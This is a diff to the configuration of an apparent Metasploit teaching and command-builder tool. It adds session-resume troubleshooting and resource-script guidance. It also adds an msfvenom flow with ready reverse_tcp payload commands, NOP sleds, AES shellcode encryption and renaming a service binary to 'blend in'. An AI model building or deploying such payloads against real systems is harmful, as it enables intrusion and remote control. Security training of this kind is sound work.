@@ -44,6 +44,14 @@ flows:
             cause: "Metasploit/PostgreSQL not fully installed."
             fix: "Install/repair: `sudo apt update && sudo apt install metasploit-framework`; see the Services troubleshooter for PostgreSQL."
             check: "msfdb init completes."
+          - trigger: "'already initialized' / database or user already exists"
+            cause: "Not an error — you (or a previous boot) already set this up before, possibly a while ago. This is the normal state on a returning session, not a fresh one."
+            fix: "Don't re-run init or reinit for this. Skip straight to step 2 (`db_status`) to confirm it's usable. Only `sudo msfdb reinit` if the DB is actually broken and you're OK wiping stored hosts/loot."
+            check: "db_status (step 2) reports connected."
+          - trigger: "postgresql: 'already running' / systemctl start reports no change"
+            cause: "Not an error — the service was already active, likely from an earlier session or auto-start on boot."
+            fix: "Nothing to fix — proceed straight to msfdb init / db_status."
+            check: "`systemctl status postgresql` shows active (running)."
       - step_id: g2
         title: "Open the console and confirm the database"
         slot_target: ACTION_OPTIONS
@@ -67,6 +75,10 @@ flows:
             cause: "PostgreSQL isn't running or the DB wasn't initialised."
             fix: "Run step 1 again: start postgresql, `sudo msfdb reinit`."
             check: "db_status says connected."
+          - trigger: "you skipped step 1 because it was already set up from before"
+            cause: "That's the expected path on a returning session — nothing wrong."
+            fix: "No fix needed. If db_status connects here, you're good to continue straight to step 3."
+            check: "db_status reports connected."
       - step_id: g3
         title: "Find an exploit for a known weakness"
         slot_target: ACTION_OPTIONS
@@ -184,6 +196,109 @@ flows:
             cause: "The exploit didn't actually land."
             fix: "Go back to steps 4-5; re-check options and target reachability."
             check: "exploit reports a session opened."
+  - flow_id: resume_existing
+    title: "Already set up or running? Check before you start fresh (reference)"
+    goal: "You've used Metasploit before on this box — check what's already running/stored so you don't clobber it or fight stale state."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS]
+    steps:
+      - step_id: re1
+        title: "Check what's already running before touching setup again"
+        slot_target: null
+        glossary_refs: [msfdb]
+        explanation:
+          what: "Before repeating first-time setup, check whether PostgreSQL is already running, whether another msfconsole is already open, and whether the DB is already connected."
+          why: "'Already initialized', 'already running', or 'already exists' messages are the NORMAL state on a returning session — they are not errors, and re-running init/reinit on top of them is unnecessary and (for reinit) destructive."
+          where: "Run from a plain terminal, before opening a new console."
+        find_it: "No input needed — these are read-only checks."
+        command_anatomy:
+          - {token: "pgrep -a msfconsole", does: "list any msfconsole process(es) already running, with their PID"}
+          - {token: "systemctl status postgresql", does: "check whether the database service is already active"}
+          - {token: "msfconsole -q -x \"db_status\"", does: "confirm whether the console can already reach the DB"}
+        try_this: "pgrep -a msfconsole; systemctl status postgresql --no-pager"
+        success_criteria: "You know, before doing anything else, whether a console/DB is already up — so the next steps are 'resume' not 'reinstall'."
+        expected_output: |
+          12345 msfconsole
+          ● postgresql.service - PostgreSQL RDBMS
+               Active: active (running) since ...
+        alternatives:
+          - trigger: "pgrep shows an existing msfconsole PID"
+            cause: "You (or another terminal) already have a console open — it may already hold active jobs/sessions in memory."
+            fix: "Switch to that terminal instead of opening a second, separate console — a second instance does NOT share the first one's in-memory jobs/sessions, only the DB."
+            check: "In the existing terminal, run `jobs -l` / `sessions -l` to see what it's already holding."
+      - step_id: re2
+        title: "List existing jobs and sessions before starting something new"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [job, session]
+        explanation:
+          what: "`jobs -l` lists backgrounded tasks (handlers, running scanners); `sessions -l` lists live target connections. Run both as the FIRST thing in a console you didn't just open fresh."
+          why: "Starting a new handler on a port a stale job already holds, or losing track of a still-open session from earlier, are the two most common 'I thought this was a clean start' surprises."
+          where: "ACTION_OPTIONS (-x script), right after the console opens."
+        find_it: "No input needed — read-only listing."
+        command_anatomy:
+          - {token: "jobs -l", does: "list running background jobs (e.g. handlers) with their id and port"}
+          - {token: "sessions -l", does: "list active sessions with their id and target"}
+        try_this: "msfconsole -q -x \"jobs -l; sessions -l\""
+        success_criteria: "You see every job/session that's already active (or an empty list, confirming a genuinely clean slate) before starting anything new."
+        expected_output: |
+          Jobs
+          Id  Name                            Payload
+          0   Exploit: multi/handler          windows/x64/meterpreter/reverse_tcp
+          Active sessions
+          (none)
+        alternatives:
+          - trigger: "a job or session shows up that you don't need anymore"
+            cause: "Leftover from an earlier engagement/test run — background jobs and sessions persist until you close them or the console exits."
+            fix: "`jobs -k <id>` kills a background job; `sessions -k <id>` kills a session. Do this before starting a new one that might conflict (e.g. same port)."
+            check: "Re-run `jobs -l` / `sessions -l` — the id is gone."
+      - step_id: re3
+        title: "Reuse an existing workspace instead of assuming a fresh one"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [workspace]
+        explanation:
+          what: "`workspace -l` lists every workspace already stored in the DB; `workspace <name>` (no -a) switches to one that already exists. `-a <name>` only makes sense for a genuinely new name."
+          why: "`workspace -a lab` doesn't fail if 'lab' already exists — it just switches to it — but if you typed a name that DOESN'T already exist, -a silently creates a new, empty one, and your prior hosts/loot are still sitting in whatever workspace you actually used last time."
+          where: "ACTION_OPTIONS (-x script)."
+        find_it: "No input for -l; an existing workspace name (from the -l list) to switch to."
+        command_anatomy:
+          - {token: "workspace -l", does: "list all workspaces that already exist"}
+          - {token: "workspace lab", does: "switch to the existing 'lab' workspace (no -a)"}
+        try_this: "msfconsole -q -x \"workspace -l\""
+        success_criteria: "You can see every workspace that already has data, and pick the right one by name."
+        expected_output: |
+          Workspaces
+          * default
+            lab
+        alternatives:
+          - trigger: "hosts/services look empty right after `workspace -a <name>`"
+            cause: "That name didn't already exist, so -a just created a brand-new, empty workspace — your earlier data is in a different, already-existing one."
+            fix: "`workspace -l` to see what actually exists, then `workspace <existing-name>` (no -a) to switch to it."
+            check: "hosts / services now show the expected prior data."
+      - step_id: re4
+        title: "'Address already in use' when starting a listener"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [job, handler]
+        explanation:
+          what: "Starting exploit/multi/handler (or any listener) on a port a previous job already holds fails with an address-in-use style error."
+          why: "A crashed terminal, a forgotten `-j` background job, or simply not knowing step 2's `jobs -l` check can leave a listener still bound to that LPORT from earlier."
+          where: "Same ACTION_OPTIONS script that starts the handler (see the Handler flow)."
+        find_it: "The job id holding the port, from `jobs -l`."
+        command_anatomy:
+          - {token: "jobs -l", does: "find the id of the job already bound to that port"}
+          - {token: "jobs -k <id>", does: "kill it, freeing the port"}
+        try_this: "msfconsole -q -x \"jobs -l\"   # then: jobs -k <id>   # then retry the handler"
+        success_criteria: "The handler starts cleanly, or `jobs -l` confirms the old one on that port is gone."
+        expected_output: |
+          [-] Handler failed to bind to 10.0.0.5:4444
+          Jobs
+          Id  Name
+          0   Exploit: multi/handler
+        alternatives:
+          - trigger: "'Address already in use' persists after killing the job"
+            cause: "A different process entirely (outside Metasploit) already owns that port."
+            fix: "Check with `sudo ss -ltnp | grep 4444` (or the port in question) and stop that process, or just pick a different LPORT for the new handler."
+            check: "The port is free (not listed by ss), or the handler uses a different LPORT."
+
   - flow_id: setup_db
     title: "Setup & database (reference)"
     goal: "Start PostgreSQL so the console can store hosts/loot."
@@ -469,6 +584,118 @@ flows:
             cause: "Template injection alone is not evasion — AV/EDR commonly detects known payload signatures regardless of the wrapper."
             fix: "This is expected and not something to 'fix' by evading detection — treat AV catching it as a successful control, not an obstacle. Encoding/packing for evasion is a separate, advanced topic with its own legal and ethical considerations."
             check: "Not a failure — this is the defensive control working as intended."
+
+  - flow_id: msfvenom_deepdive
+    title: "msfvenom deep-dive: discover, size & disguise payloads (reference, advanced)"
+    goal: "Find out what a payload needs BEFORE building it, then shape its size, encryption and branding."
+    command_builder_id: msfvenom
+    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS]
+    steps:
+      - step_id: mvd1
+        title: "Discover what a payload actually needs (--list-options)"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [msfvenom, datastore]
+        explanation:
+          what: "`-p <payload> --list-options` prints that payload's standard, advanced and evasion datastore options — WITHOUT generating anything. It's the payload equivalent of msfconsole's `show options`."
+          why: "Every payload path (windows/x64/meterpreter/reverse_tcp vs linux/x86/shell_bind_tcp, etc.) needs different values — some need LPORT only, some need LHOST+LPORT, some need neither. Guessing wastes a build; this tells you exactly what to fill in first."
+          where: "ACTION_OPTIONS; nothing else in the command matters when this flag is present — no format/output needed."
+        find_it: "Any payload path from `msfvenom --list payloads` (or one you already know, e.g. from the Payloads deep-dive flow)."
+        command_anatomy:
+          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp", does: "the payload you're about to build"}
+          - {token: "--list-options", does: "print its options instead of building anything"}
+        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options"
+        success_criteria: "A table of options (Name, Current Setting, Required, Description) prints — e.g. LHOST/LPORT both marked 'yes' under Required."
+        expected_output: |
+          Options for payload/windows/x64/meterpreter/reverse_tcp:
+          Name   Current Setting  Required  Description
+          ----   ---------------  --------  -----------
+          LHOST                   yes       The listen address
+          LPORT  4444             yes       The listen port
+        alternatives:
+          - trigger: "'Invalid Payload Selected' or no output"
+            cause: "Typo'd payload path."
+            fix: "Confirm the exact path with `msfvenom --list payloads` (or `msfvenom --list payloads | grep meterpreter`)."
+            check: "Re-run with the exact listed path."
+      - step_id: mvd2
+        title: "Control payload size and add a NOP sled"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "This still generates a real payload's bytes — authorized lab/engagement only. Size limits and NOP sleds are shaping techniques, NOT antivirus evasion; don't rely on them for that."
+        glossary_refs: [nopsled]
+        explanation:
+          what: "`-s <bytes>` caps the total payload size (the build fails if it would be bigger); `--encoder-space <bytes>` caps just the ENCODED portion (defaults to the -s value). `-n <bytes>` prepends a NOP sled of that many no-op instructions; `--pad-nops` changes -n's meaning to 'pad the NOP sled until the TOTAL is exactly this size' instead of 'add this many extra bytes'."
+          why: "A NOP sled gives an imprecise jump/return address room to 'slide' into your shellcode instead of landing a few bytes off and crashing — a classic exploit-development technique. Size limits matter when you're injecting into a fixed-size buffer (e.g. a vulnerable function's stack space) that can't hold an arbitrarily large payload."
+          where: "ACTION_OPTIONS."
+        find_it: "-s/--encoder-space: the buffer size limit from your target analysis, if any. -n: start small (16-32 bytes) — a NOP sled is a shaping technique, not something that needs to be huge."
+        command_anatomy:
+          - {token: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
+          - {token: "-n 16", does: "prepend a 16-byte NOP sled"}
+          - {token: "-s 500", does: "fail the build if the result exceeds 500 bytes"}
+          - {token: "-f raw -o payload.bin", does: "output as usual"}
+        try_this: "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -n 16 -s 500 -f raw -o payload.bin"
+        success_criteria: "The reported payload size includes the NOP sled, and the build succeeds only if it fits within -s."
+        expected_output: |
+          Found 1 compatible encoders
+          Payload size: 90 bytes
+          Final size of raw file: 106 bytes
+          Saved as: payload.bin
+        alternatives:
+          - trigger: "'The payload has exceeded the allowed space' or similar size error"
+            cause: "The payload (plus any NOP sled/encoding) is bigger than -s allowed."
+            fix: "Raise -s, drop the NOP sled, or pick a smaller payload (a stageless payload is often smaller than a full meterpreter)."
+            check: "Re-run with a larger -s or a smaller payload/nopsled."
+      - step_id: mvd3
+        title: "Encrypt the shellcode itself"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "A generated payload is real malware on disk — authorized lab/engagement only. Encryption here is separate from AV evasion; don't treat it as reliable evasion either."
+        glossary_refs: [shellcode_encryption]
+        explanation:
+          what: "`--encrypt <type>` wraps the raw shellcode in aes256/rc4/xor/base64 (use `--list encrypt` to see all); `--encrypt-key`/`--encrypt-iv` supply the key/initialization-vector some of those types need. This is different from `-e`/--encoder, which reshapes the payload to dodge bad characters — --encrypt genuinely encrypts the bytes."
+          why: "A landing stub (loaded separately, or generated with the same options) decrypts the payload at runtime — this keeps the shellcode's real bytes out of a static file scan, though modern EDR still watches the DECRYPTION happening at runtime."
+          where: "ACTION_OPTIONS."
+        find_it: "`msfvenom --list encrypt` to see the exact type names. A key/IV of your choosing for aes256/rc4 — leave blank and msfvenom generates one for you (printed in its output, save it if you need to decrypt matching output elsewhere)."
+        command_anatomy:
+          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
+          - {token: "--encrypt aes256", does: "encrypt the shellcode with AES-256"}
+          - {token: "-f raw -o payload.enc", does: "output as usual"}
+        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 --encrypt aes256 -f raw -o payload.enc"
+        success_criteria: "msfvenom prints the encryption key/IV it used (if you didn't supply one) alongside the saved file."
+        expected_output: |
+          [*] Encrypting the payload with AES256 encryption...
+          [*] Encryption Key: 8f14e45fceea167a5a36dedd4bea2543...
+          [*] Encryption IV: e4bd80a49b91f8ac...
+          Saved as: payload.enc
+        alternatives:
+          - trigger: "'Encryption type is not supported' / unknown type"
+            cause: "Typo'd encryption type."
+            fix: "Confirm exact names with `msfvenom --list encrypt`."
+            check: "Re-run with a listed type."
+      - step_id: mvd4
+        title: "Rename output artifacts to blend in"
+        slot_target: ACTION_OPTIONS
+        destructive: true
+        recovery: "Still produces a real payload artifact — authorized lab/engagement only. Renaming is cosmetic, not evasion; AV/EDR inspects behaviour and byte signatures, not section/variable/service names."
+        explanation:
+          what: "`--service-name <name>` sets the Windows service name for service-executable formats (`-f exe-service`); `--sec-name <name>` sets the PE section name used when generating large Windows binaries (default: a random 4-character string); `-v/--var-name <name>` sets the variable name used in source-code output formats (`-f c`, `-f python`, `-f powershell`, etc.)."
+          why: "A payload named 'msfvenom_payload' or a service literally called 'Meterpreter' is an obvious tell in Task Manager / Services / decompiled source — these flags exist purely to make generated artifacts look less like a generator's default output while you're learning to recognise this class of technique defensively."
+          where: "ACTION_OPTIONS."
+        find_it: "Pick names that resemble legitimate system components ONLY in an authorized lab context — this is taught for recognition/defence, not for use against real third-party systems."
+        command_anatomy:
+          - {token: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444", does: "the payload as usual"}
+          - {token: "--service-name UpdaterSvc", does: "the Windows service name (service-executable formats only)"}
+          - {token: "-f exe-service -o svc.exe", does: "the matching output format + file"}
+        try_this: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 --service-name UpdaterSvc -f exe-service -o svc.exe"
+        success_criteria: "svc.exe is written; when installed as a service in a lab, it shows the chosen name instead of a default."
+        expected_output: |
+          Payload size: 510 bytes
+          Saved as: svc.exe
+        alternatives:
+          - trigger: "--service-name seems to have no effect"
+            cause: "It only applies to service-executable formats (e.g. `-f exe-service`, `-f exe-small` variants) — plain `-f exe` ignores it."
+            fix: "Switch Format to a service-executable variant, or use --sec-name/-v instead if you're not building a service binary."
+            check: "Confirm the output format actually supports a service name."
+
   - flow_id: handler
     title: "multi/handler (catch the callback) (reference)"
     goal: "Listen for a reverse payload."
@@ -498,6 +725,10 @@ flows:
             cause: "Payload LHOST/LPORT don't match the handler, or routing/firewall blocks it."
             fix: "Make payload and handler LHOST/LPORT identical; check routing/firewall."
             check: "Compare msfvenom LHOST/LPORT to the handler."
+          - trigger: "'Address already in use' / handler fails to bind"
+            cause: "A job from an earlier session (or a crashed terminal) is already bound to that LPORT — see the 'Already set up or running?' flow."
+            fix: "`jobs -l` to find the stale job holding the port, `jobs -k <id>` to free it, then retry; or pick a different LPORT."
+            check: "`jobs -l` no longer shows a listener on that port, or the new handler uses a free one."
   - flow_id: workflow_db
     title: "Workflow aids (reference)"
     goal: "Organize an engagement in the DB."
@@ -555,6 +786,88 @@ flows:
             fix: "See the Packages/keys/certs troubleshooter."
             check: "Resolve apt first, then retry."
 
+  - flow_id: console_launch_modes
+    title: "msfconsole launch modes: resource scripts & logging (reference)"
+    goal: "Automate a whole sequence with a saved script, capture a transcript, or skip the database — all before you type a single console command."
+    command_builder_id: msfconsole
+    slots: [PROGRAM, GLOBAL_OPTIONS, ACTION_OPTIONS, OUTPUT_OPTIONS]
+    steps:
+      - step_id: cl1
+        title: "Automate a sequence with a resource script (-r)"
+        slot_target: ACTION_OPTIONS
+        glossary_refs: [resource_script]
+        explanation:
+          what: "A resource script is a plain text file with one console command per line — the same commands you'd type after `msf6 >`. `-r <file>.rc` runs it automatically on startup, top to bottom, exactly as if you'd typed each line."
+          why: "Every other flow in this tool shows commands chained with `-x \"cmd; cmd\"` on one line — fine for 2-3 commands, unreadable and unmaintainable for a real 15-step engagement workflow. A resource script is the same idea, but as a saved, reusable, version-controllable file."
+          where: "ACTION_OPTIONS; -r takes the file path as its argument."
+        find_it: >
+          Write one with a text editor — each line is a normal console command, comments start with #.
+          Example content for ~/scripts/recon.rc:
+          `workspace -a lab` / `db_nmap -sV 10.0.0.0/24` / `hosts` / `services`.
+        command_anatomy:
+          - {token: "msfconsole -q", does: "quiet startup"}
+          - {token: "-r ~/scripts/recon.rc", does: "run every line in this file automatically"}
+        try_this: "msfconsole -q -r ~/scripts/recon.rc"
+        success_criteria: "Each line from the .rc file executes in order, same as typing it manually, then you land at the normal msf6 prompt."
+        expected_output: |
+          [*] Processing /home/user/scripts/recon.rc for ERB directives.
+          resource (recon.rc)> workspace -a lab
+          resource (recon.rc)> db_nmap -sV 10.0.0.0/24
+          msf6 >
+        alternatives:
+          - trigger: "'No such file' error"
+            cause: "Wrong path, or the file wasn't saved where you think."
+            fix: "Use an absolute or ~-relative path; confirm with `ls ~/scripts/recon.rc` first."
+            check: "The file exists at the exact path given to -r."
+          - trigger: "a line in the middle fails and stops everything"
+            cause: "Resource scripts run sequentially — one bad command (e.g. `use` on a non-existent module) can break later lines that depended on it."
+            fix: "Test complex sequences interactively first, or keep resource scripts short and single-purpose."
+            check: "Re-run the failing line by hand in the console to see the exact error."
+      - step_id: cl2
+        title: "Save a transcript of the whole session (-o)"
+        slot_target: OUTPUT_OPTIONS
+        explanation:
+          what: "`-o <file>` logs everything printed to the console — banner, command output, errors — into a file, in addition to showing it on screen."
+          why: "Unlike a resource script (which is your INPUT), this captures the OUTPUT — useful as engagement evidence or for reviewing a long automated run later without staring at a scrollback buffer."
+          where: "OUTPUT_OPTIONS."
+        find_it: "Any writable path — your home directory always works."
+        command_anatomy:
+          - {token: "msfconsole -q -r ~/scripts/recon.rc", does: "an automated run, from step 1"}
+          - {token: "-o ~/logs/recon_session.log", does: "also write everything printed to this file"}
+        try_this: "msfconsole -q -r ~/scripts/recon.rc -o ~/logs/recon_session.log"
+        success_criteria: "The console runs normally and ~/logs/recon_session.log contains the same text that scrolled past on screen."
+        expected_output: |
+          (console output as usual, AND:)
+          $ cat ~/logs/recon_session.log
+          [*] Processing /home/user/scripts/recon.rc for ERB directives.
+          ...
+        alternatives:
+          - trigger: "permission denied writing the log"
+            cause: "Unwritable directory."
+            fix: "Save under your home: `mkdir -p ~/logs && msfconsole -q -o ~/logs/session.log`."
+            check: "The log directory exists and is writable."
+      - step_id: cl3
+        title: "Skip the database entirely (-n)"
+        slot_target: GLOBAL_OPTIONS
+        glossary_refs: [msfdb]
+        explanation:
+          what: "`-n`/`--no-database` starts msfconsole WITHOUT connecting to PostgreSQL at all, even if it's running and configured."
+          why: "Faster startup for a quick one-off lookup (e.g. `search`, `info`, generating a payload reminder) when you don't need hosts/services/loot tracking — also useful for confirming whether a problem is 'the console' or 'the database connection' when troubleshooting."
+          where: "GLOBAL_OPTIONS."
+        find_it: "No input needed — it's a plain flag."
+        command_anatomy:
+          - {token: "msfconsole -q -n", does: "quiet startup, no database connection attempted"}
+        try_this: "msfconsole -q -n -x \"search type:exploit name:vsftpd\""
+        success_criteria: "The console starts noticeably faster and `db_status` (if you check) reports no database connected — by choice, not by error."
+        expected_output: |
+          msf6 > search type:exploit name:vsftpd
+          (results print normally — search doesn't need the DB)
+        alternatives:
+          - trigger: "a command complains it needs the database (e.g. db_nmap, workspace)"
+            cause: "-n disables the DB for the whole session — anything DB-backed (db_nmap, hosts, workspace, loot) won't work."
+            fix: "Drop -n if you need those commands; -n is only for DB-independent quick tasks."
+            check: "Re-run without -n if DB-backed commands are needed."
+
 quick_build:
   builder: msfvenom
   title: "Generate payload"
@@ -577,6 +890,10 @@ quick_build:
       type: string
       placeholder: "EXITFUNC=thread,PrependMigrate=true  (optional, comma-separated KEY=VAL pairs)"
       help: "Any other payload option beyond LHOST/LPORT, as KEY=VAL. Separate multiple with commas."
+    - field_id: list_options
+      label: "List this payload's options instead of building (--list-options)"
+      type: bool
+      help: "Set Payload above, then check this — shows exactly what datastore values (LHOST, LPORT, etc.) this payload accepts, WITHOUT generating anything. The natural first step before filling in the rest of this form."
     - field_id: arch
       label: "Architecture (-a)"
       type: string
@@ -612,6 +929,58 @@ quick_build:
       type: choice
       choices: [aes256, base64, rc4, xor]
       help: "Encrypts/encodes the shellcode itself (different from the Encoder field above). Optional."
+    - field_id: encrypt_key
+      label: "Encryption key (--encrypt-key)"
+      type: string
+      placeholder: "optional — pairs with Encrypt above"
+    - field_id: encrypt_iv
+      label: "Encryption IV (--encrypt-iv)"
+      type: string
+      placeholder: "optional — pairs with Encrypt above"
+    - field_id: smallest
+      label: "Use the smallest possible payload (--smallest)"
+      type: bool
+      help: "Tries every available encoder and keeps whichever produces the smallest result. Usually used WITHOUT also picking an Encoder yourself."
+    - field_id: space
+      label: "Maximum payload size, bytes (-s/--space)"
+      type: int
+      placeholder: "e.g. 1000  (optional)"
+      help: "The build fails if the final payload would exceed this size — for injecting into a size-constrained buffer."
+    - field_id: encoder_space
+      label: "Maximum ENCODED payload size (--encoder-space)"
+      type: int
+      placeholder: "optional — defaults to the Space value above"
+    - field_id: nopsled
+      label: "NOP sled length, bytes (-n/--nopsled)"
+      type: int
+      placeholder: "e.g. 16  (optional)"
+      help: "Prepends this many NOP (no-op) instructions before the payload — the classic technique for landing safely when a jump address isn't exact."
+    - field_id: pad_nops
+      label: "Pad with NOPs to reach an exact total size (--pad-nops)"
+      type: bool
+      help: "Only has an effect together with NOP sled length above — uses that value as the TOTAL payload size, auto-filling the gap with NOPs."
+    - field_id: add_code
+      label: "Prepend additional shellcode file (-c/--add-code)"
+      type: path
+      placeholder: "extra_shellcode.bin  (optional, Windows payloads)"
+    - field_id: service_name
+      label: "Service name for a service binary (--service-name)"
+      type: string
+      placeholder: "optional — only for service-executable output formats"
+    - field_id: sec_name
+      label: "Custom PE section name (--sec-name)"
+      type: string
+      placeholder: "optional — default is a random 4-character string"
+      help: "The section name used when generating large Windows binaries; a default random name is normal, but a custom one can help blend in."
+    - field_id: var_name
+      label: "Custom output variable name (-v/--var-name)"
+      type: string
+      placeholder: "optional — for source-code formats like C/Python/Powershell"
+    - field_id: timeout
+      label: "STDIN read timeout, seconds (-t/--timeout)"
+      type: int
+      placeholder: "default 30, 0 = disable  (optional)"
+      help: "Only matters when Payload is '-' or STDIN (reading custom shellcode from standard input) — ignored for a normal named payload."
     - field_id: format
       label: "Format (-f)"
       type: string
